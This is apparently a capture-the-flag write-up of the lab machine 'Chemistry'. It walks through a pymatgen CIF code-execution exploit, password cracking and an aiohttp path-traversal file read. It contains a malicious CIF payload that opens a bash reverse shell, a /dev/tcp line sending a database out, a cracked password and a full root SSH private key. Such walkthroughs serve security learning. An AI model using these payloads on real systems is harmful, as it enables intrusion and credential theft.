---
title: Chemistry
published: true
layout: post
---

<br />

---------------
Chemistry is an easy-difficulty Linux machine that showcases a Remote Code Execution (RCE) vulnerability in the `pymatgen` (CVE-2024-23346) Python library by uploading a malicious `CIF` file to the hosted `CIF Analyzer` website on the target. After discovering and cracking hashes, we authenticate to the target via SSH as `rosa` user. For privilege escalation, we exploit a Path Traversal vulnerability that leads to an Arbitrary File Read in a Python library called `AioHTTP` (CVE-2024-23334) which is used on the web application running internally to read the root flag. 
<br />

<iframe style="aspect-ratio: 16 / 9; width: 65%; display: block; margin: auto;" src="https://www.youtube.com/embed/71QfrjRcA_s?si=KiNJRFdOn2VzRxln" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<br />

---------------------------------------------------
<br />

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />

Let's start by scanning for **open ports**:

```bash
sudo nmap -sS 10.10.11.38 -p- -T4 --min-rate 5000 -oN all_tcp_ports.txt --open -n -Pn -vv
sudo nmap -sU 10.10.11.38 -p- -T4 --min-rate 5000 -oN all_udp_ports.txt --open -n -Pn -vv
```
<br />

There are **2 open ports**:
+ **22/tcp**
+ **5000/tcp**

<br />

Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.11.38 -p 22,5000 -T4 --min-rate 5000 -oX open_tcp_ports.xml -oN open_tcp_ports.txt --version-all -n -Pn -A
```
<br />

These services are:
+ **22/tcp OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)**
+ **5000/tcp Werkzeug httpd 3.0.3 (Python 3.9.5)**

<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.11.38 -p 22,5000 -T4 --min-rate 5000 --script="vuln or intrusive or discovery" -oN tcp_vulns.txt -oX tcp_vulns.xml -n -Pn
```
<br />

These scans didn't return any relevant information.
<br />

------
<br />
### Foothold

We can start by taking a look into the website:<br />

![](/assets/Chemistry/1.png)
<br />
<br />

Let's see what happens if we create an account:<br />

![](/assets/Chemistry/2.png)
<br />
<br />

It seems that this website allow us to **upload a CIF file**, a quick search on Google revealed us that we can **inject commands** using CIF files:<br />

![](/assets/Chemistry/3.png)
<br />
<br />

It seems that a vulnerability in Python's pymatgen library (**CVE-2024-23346**) allows for RCE, so let's take the PoC and modify it to our need:

```bash
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.4/4444 0>&1'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```
<br />

Let's upload this file, start a **reverse shell listener** and execute it:

```bash
nc -nlvp 4444
```

![](/assets/Chemistry/4.png)
<br />
<br />

We got a reverse shell in the machine, however **this user doesn't the flag**, but there is **another user called rosa** that have it, inspecting the machine, I found **SQLite credentials** in the **app.py file** that I didn't use, but I also found the SQLite database:<br />

![](/assets/Chemistry/5.png)
<br />
<br />

Let's bring it to our machine and inspect this database:

```bash
Kali> nc -nlvp 4444 > database.db
Chemistry> cat database.db > /dev/tcp/10.10.16.4/4444
```

![](/assets/Chemistry/6.png)
<br />
<br />

Let's inspect the **database**:

```bash
sqlite3 database.db
.tables
select * from user;
```

![](/assets/Chemistry/7.png)
<br />
<br />

We found a table with users, one of them being rosa, which is also a user in the machine, so let's copy this **hash**, identify its encryption algorithm and crack it:

```bash
echo '63ed86ee9f624c7b14f1d4f43dc251a5' > rosa_hash
hash-identifier rosa_hash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 rosa_hash 
```

![](/assets/Chemistry/8.png)
<br />
<br />

We cracked the hash, let's try to login using this password:

```bash
sshpass -p 'unicorniosrosados' ssh rosa@10.10.11.38
```

![](/assets/Chemistry/9.png)
<br />
<br />

We got the flag! Nice, let's escalate privileges.
<br />

------
<br />
### Privilege Escalation

Enumerating the machine, I found a service running internally:

```bash
ss -tulpen
```

![](/assets/Chemistry/10.png)
<br />
<br />

Let's perform **SSH local port forwarding** to access it:

```bash
ssh -N -L 127.0.0.1:8080:127.0.0.1:8080 rosa@10.10.11.38
```

![](/assets/Chemistry/11.png)
<br />
<br />

We found a website that seems to be for monitoring purposes, after inspecting it for a while, an **interesting piece of information** popped out:

```bash
whatweb 127.0.0.1:8080 | tee whatweb8080.txt
```

![](/assets/Chemistry/12.png)
<br />
<br />

Let's look for vulnerabilities related with this **AIOHTTP's version**:<br />

![](/assets/Chemistry/13.png)
<br />
<br />

It seems that this web server is vulnerable to **CVE-2024-23334**, let's copy the exploit in this first GitHub repository and inspect it:<br />

![](/assets/Chemistry/14.png)
<br />
<br />

I tried using the script as it is, but it didn't work, it seems that the directory with static files is not */static*, so let's search for directories using feroxbuster:

```bash
feroxbuster --url http://127.0.0.1:8080 -r --threads 25 -d 0 -o feroxbuster_dir_and_file_enum_8080.txt -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![](/assets/Chemistry/15.png)
<br />
<br />

***/assets*** seems to be a directory for static files, so let's try the exploit this way, I will try to print **root's SSH private key**:

```bash
python3 CVE-2024-23334.py -u http://127.0.0.1:8080 -f /root/.ssh/id_rsa -d /assets
```

![](/assets/Chemistry/16.png)
<br />
<br />

This is a great discovery! Let's save this **private key**, log in using **SSH** and print the **flag**:

```bash
echo '-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----' > root_id_rsa
chmod 600 root_id_rsa
ssh -i root_id_rsa root@10.10.11.38
```

![](/assets/Chemistry/17.png)
<br />
<br />
